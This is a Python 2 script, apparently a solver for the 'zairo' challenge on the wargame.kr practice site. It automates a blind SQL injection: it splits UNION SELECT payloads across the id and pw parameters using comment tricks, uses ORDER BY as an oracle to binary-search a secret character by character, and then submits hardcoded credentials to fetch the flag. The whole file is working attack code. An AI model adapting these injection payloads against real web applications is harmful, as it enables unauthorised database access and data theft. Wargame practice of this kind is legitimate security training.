#!/usr/bin/env python
# -*- coding: utf8 -*-

import re, sys, time, urllib, urllib2

headers = {'Host': 'wargame.kr:8080'}
s = "0123456789abcdefghijklmnopqrstuvwxyz"
chars = list(s)[::-1]
ans = ""

while True and len(chars):
    lo = 0
    hi = len(chars)
    guessed = []
    while lo <= hi:
        time.sleep(0.01)
        mid = (lo + hi) // 2
        char = chars[mid]
        if char in guessed:
            ans += char
            chars.remove(char)
            break
        charless = list(chars)
        charless.remove(char)
        guess = "{0}{1}{2}".format(ans, char, ''.join(charless))
        guessed.append(char)

        id = urllib.quote("'UNION SELECT * FROM findflag_2/*")
        pw = urllib.quote("*/UNION SELECT 1,2,3,\"{}\",5 ORDER BY 4 ASC#".format(guess))
        data = "?id={0}&pw={1}&flag=".format(id, pw)

        req = urllib2.Request("http://wargame.kr:8080/zairo/" + data, '', headers)
        response = urllib2.urlopen(req)
        res = response.read()
        count = re.findall(r"NOW COUNT = (\d+)", res)[0]

        if "reset" in res:
            sys.exit("[!] Failed : FLAG RESET")

        if "zairowkdlfhdkel" in res:
            lo = mid
        else:
            hi = mid

        print "{0}\t{1}\t{2}\t{3}\t{4}".format(guess, hi, lo, mid, count)
    pass
req = urllib2.Request("http://wargame.kr:8080/zairo/?id=zairowkdlfhdkel&pw=wkdlfhpw!!@%%%23@@%23&flag={0}".format(guess), '', headers)
response = urllib2.urlopen(req).read()
flag = re.findall(r"FLAG : <b>([0-9a-f]+)</b>", response)
print "[*] Guess: {0}".format(guess)
print "[!] Success! FLAG: {0}".format(flag[0])